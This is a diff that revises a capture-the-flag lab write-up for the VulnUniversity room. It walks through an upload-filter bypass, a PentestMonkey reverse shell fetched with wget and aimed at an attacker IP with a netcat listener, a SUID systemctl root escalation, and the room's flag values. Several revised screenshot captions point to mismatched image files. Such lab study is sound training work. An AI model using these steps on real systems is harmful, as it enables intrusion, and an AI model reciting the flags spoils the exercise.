@@ -26,19 +26,15 @@ VulnUniversity is a beginner-friendly room that walks you through a pretty reali
 
 ### 1. Scanning the target
 
-Started with a basic nmap scan to see what's running:
+Started with an Nmap version scan to discover open ports and services:
 
 ```bash
 nmap -sV <target-ip>
 ```
 
-![nmap initial scan](screenshots/01-nmap-initial-scan.png)
+![Nmap scan initialization](screenshots/01-nmap-initial-scan.png)
 
-![nmap results](screenshots/02-nmap-scan-results.png)
-
-![nmap details](screenshots/03-nmap-scan-details.png)
-
-![nmap complete](screenshots/04-nmap-scan-complete.png)
+![Nmap scan results](screenshots/02-nmap-scan-results.png)
 
 Got back 6 open ports:
 
@@ -57,19 +53,15 @@ Port 3333 is where the web server is. Non-standard port, so easy to miss if you'
 
 ### 2. Finding hidden directories
 
-Ran gobuster against the web server on 3333:
+Ran Gobuster to search for hidden directories on the web server running on port 3333:
 
 ```bash
 gobuster dir -u http://<target-ip>:3333 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![gobuster running](screenshots/05-gobuster-scan.png)
+![Gobuster scan initialization and first attempt](screenshots/03-nmap-scan-details.png)
 
-![gobuster running 2](screenshots/06-gobuster-scan-2.png)
-
-![gobuster results](screenshots/07-gobuster-results.png)
-
-![gobuster done](screenshots/08-gobuster-findings.png)
+![Gobuster scan results showing /internal directory](screenshots/04-nmap-scan-complete.png)
 
 Found a `/internal` directory — this turned out to be a file upload page.
 
@@ -77,95 +69,118 @@ Found a `/internal` directory — this turned out to be a file upload page.
 
 ### 3. The upload page
 
-Went to `http://<target-ip>:3333/internal/` and found a form to upload files.
+Navigated to the `/internal/` directory at `http://<target-ip>:3333/internal/` and discovered a file upload form. 
 
-![internal upload page](screenshots/09-web-internal-page.png)
+![File upload page](screenshots/05-gobuster-scan.png)
 
-Tried uploading a `.php` file and got "Extension not allowed". So there's a filter, but these are usually bypassable. Time for Burp.
+Attempting to upload a standard `.php` file resulted in an "Extension not allowed" error message, confirming client/server-side extension filtering is in place.
+
+![Extension not allowed error](screenshots/06-gobuster-scan-2.png)
+
+![Upload error validation](screenshots/07-gobuster-results.png)
+
+So there's a filter, but these are usually bypassable. Time for Burp.
 
 ---
 
 ### 4. Bypassing the file upload filter with Burp
 
-Intercepted the upload request, sent it to Intruder, and fuzzed the file extension to see what gets through. Used this list: `.php .php3 .php4 .php5 .phtml`
+To bypass this filter, the file upload request was intercepted using Burp Suite.
 
-![burp intruder results](screenshots/10-burp-intercept.png)
+![Burp Suite HTTP history showing file upload request](screenshots/08-gobuster-findings.png)
 
-![extension testing](screenshots/11-extension-testing.png)
+The request was sent to Burp Intruder, configuring the file extension as the payload position (e.g., `phpexts.§php§`). A simple list of PHP-related extensions was set up: `.php`, `.php3`, `.php4`, `.php5`, and `.phtml`.
 
-Looking at response lengths — `.phtml` came back with a different length than the blocked ones, which means it was accepted. Confirmed.
+![Burp Intruder payload configuration](screenshots/09-web-internal-page.png)
 
-![phtml accepted](screenshots/12-phtml-accepted.png)
+The attack was launched. Analyzing the response lengths revealed that the `.phtml` extension returned a different response status/length (or success indicator) than the others, indicating it was successfully accepted by the server.
+
+![Burp Intruder results identifying .phtml extension success](screenshots/10-burp-intercept.png)
 
 ---
 
 ### 5. Getting a shell
 
-Grabbed the PentestMonkey PHP reverse shell, renamed it to `.phtml`, and changed the IP/port to point back to my machine:
+Downloaded the PentestMonkey PHP reverse shell script and renamed it to use the allowed `.phtml` extension:
+
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+mv php-reverse-shell.php php-reverse-shell.phtml
+```
+
+![Downloading and renaming reverse shell](screenshots/11-extension-testing.png)
+
+Edited the `$ip` and `$port` parameters inside the script to point back to the Attacker Box IP and listener port using GNU nano:
 
 ```php
 $ip = '<attacker-ip>';
 $port = 1234;
 ```
 
-Set up a listener:
+![Modifying reverse shell configuration in nano](screenshots/12-phtml-accepted.png)
+
+Set up a netcat listener on the specified port:
 
 ```bash
 nc -lvnp 1234
 ```
 
-Uploaded the shell through `/internal`, then navigated to:
+Uploaded the configured `php-reverse-shell.phtml` shell through the `/internal` upload page. The server responded with a "Success" message:
 
-```
-http://<target-ip>:3333/internal/uploads/php-reverse-shell.phtml
-```
+![Successful reverse shell upload](screenshots/13-reverse-shell-upload.png)
 
-![reverse shell upload](screenshots/13-reverse-shell-upload.png)
+Triggered the reverse shell by navigating to `http://<target-ip>:3333/internal/uploads/php-reverse-shell.phtml`. The netcat listener caught the incoming connection as the `www-data` user:
 
-![nc listener](screenshots/14-nc-listener.png)
+![Netcat listener catching incoming reverse shell](screenshots/14-nc-listener.png)
 
-![shell landed](screenshots/15-shell-obtained.png)
-
-Got a shell back as `www-data`. Stabilised it:
+Stabilized the shell using Python to spawn a fully interactive tty bash session:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
-![shell stable](screenshots/16-shell-enumeration.png)
+![Stabilizing shell connection via python pty](screenshots/15-shell-obtained.png)
+
+*(Note: If the initial shell session gets disconnected, a new netcat listener can be re-run to re-acquire the shell).*
+
+![Active shell session re-establishment](screenshots/16-shell-enumeration.png)
 
 ---
 
 ### 6. User flag
 
-Checked `/etc/passwd` for users, saw `bill` had a home directory. Went there:
+Checked `/etc/passwd` for users on the system with login shells:
+
+```bash
+cat /etc/passwd | grep "/bin/bash"
+```
+
+![Enumerating passwd file to discover users](screenshots/17-user-flag.png)
+
+Discovered the user `bill`. Located `user.txt` in bill's home directory and read the user flag:
 
 ```bash
 cat /home/bill/user.txt
 ```
 
-![user flag](screenshots/17-user-flag.png)
+![Reading user flag from bill home directory](screenshots/18-suid-enumeration.png)
 
-**User flag: `8bd7992fbe8a6ad22a63361004cfcedb`**
+**User flag:** `8bd7992fbe8a6ad22a63361004cfcedb`
 
 ---
 
 ### 7. Privilege escalation
 
-Looked for SUID binaries:
+Conducted a search for SUID binaries:
 
 ```bash
-find / -perm /4000 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
 ```
 
-![suid enumeration](screenshots/18-suid-enumeration.png)
+The binary `/bin/systemctl` was found to have the SUID bit set. According to GTFOBins, this can be exploited to escalate privileges by executing a custom systemd service wrapper.
 
-![systemctl suid](screenshots/19-systemctl-suid.png)
-
-`/bin/systemctl` had the SUID bit set — that's not normal at all. Checked GTFOBins and it has a listed exploit for exactly this.
-
-The idea: create a temporary systemd service that runs `chmod u+s /bin/bash` as root, then use `bash -p` to get a root shell.
+To exploit this, we construct a temporary systemd unit file that sets the SUID bit (`chmod u+s`) on `/bin/bash` when executed, then link and enable/run the service using `systemctl`:
 
 ```bash
 TF=$(mktemp).service
@@ -175,39 +190,49 @@ ExecStart=/bin/bash -c "chmod u+s /bin/bash"' > $TF
 
 /bin/systemctl link $TF
 /bin/systemctl enable --now $(basename $TF)
-/bin/systemctl start $(basename $TF)
 ```
 
-![privesc service](screenshots/20-privesc-service.png)
+![Creating and registering SUID systemctl exploit service](screenshots/19-systemctl-suid.png)
 
-Checked `/bin/bash` — the `s` bit is now set:
+Start the service to execute the wrapper, then verify that the SUID permission bit has been successfully applied to `/bin/bash`:
 
 ```bash
+/bin/systemctl start $(basename $TF)
 ls -l /bin/bash
-# -rwsr-xr-x 1 root root ...
 ```
 
-![bash suid](screenshots/21-suid-bash.png)
+![Running exploit service and verifying bash SUID permissions](screenshots/20-privesc-service.png)
 
 ---
 
 ### 8. Root
 
+Execute the SUID bash binary with the `-p` parameter to spawn a root shell, and verify current privileges:
+
 ```bash
 /bin/bash -p
 whoami
-# root
 ```
 
-![root shell](screenshots/22-root-shell.png)
+![Spawning SUID root shell](screenshots/21-suid-bash.png)
+
+Verify user ID and effective root group ownership:
+
+```bash
+id
+```
+
+![Verifying root privileges](screenshots/22-root-shell.png)
+
+Finally, read the root flag located at `/root/root.txt`:
 
 ```bash
 cat /root/root.txt
 ```
 
-![root flag](screenshots/23-root-flag.png)
+![Reading root flag](screenshots/23-root-flag.png)
 
-**Root flag: `a58ff8579f0a9270368d33a9966c7fd5`**
+**Root flag:** `a58ff8579f0a9270368d33a9966c7fd5`
 
 ---
 
